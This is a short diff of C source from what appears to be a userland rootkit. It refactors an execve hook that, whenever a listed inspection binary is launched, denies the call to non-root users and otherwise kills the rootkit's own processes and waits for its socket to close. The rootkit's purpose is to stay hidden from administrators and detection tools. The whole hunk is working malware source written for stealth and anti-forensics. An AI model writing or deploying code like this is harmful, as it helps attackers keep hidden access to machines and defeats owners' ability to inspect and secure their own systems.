@@ -39,19 +39,15 @@ int execve(const char *filename, char *const argv[], char *const envp[])
 
     /* if someone is running a process that could lead to us being visible,
      * kill all rootkit processes. */
-    int i;
-    for(i=0; i<sizeof(bad_bins)/sizeof(bad_bins[0]); i++)
+    if(is_bad_proc(filename))
     {
-        if(is_bad_proc(filename,bad_bins[i]))
-        {
-            if(getuid() != 0){ errno=EPERM; return -1; } // need root perms to be able to kill our procs :)
-            kill_rk_procs();
+        if(getuid() != 0){ errno=EPERM; return -1; } // need root perms to be able to kill our procs :)
+        kill_rk_procs();
 
-            /* we wait a short time just so we're sure the socket will be totally closed
-             * by the time they're getting to see their output. i could likely get away with
-             * making this a shorter delay. perhaps not. depends. */
-            sleep(3);
-        }
+        /* we wait a short time just so we're sure the socket will be totally closed
+         * by the time they're getting to see their output. i could likely get away with
+         * making this a shorter delay. perhaps not. depends. */
+        sleep(3);
     }
 
     return o_execve(filename,argv,envp);
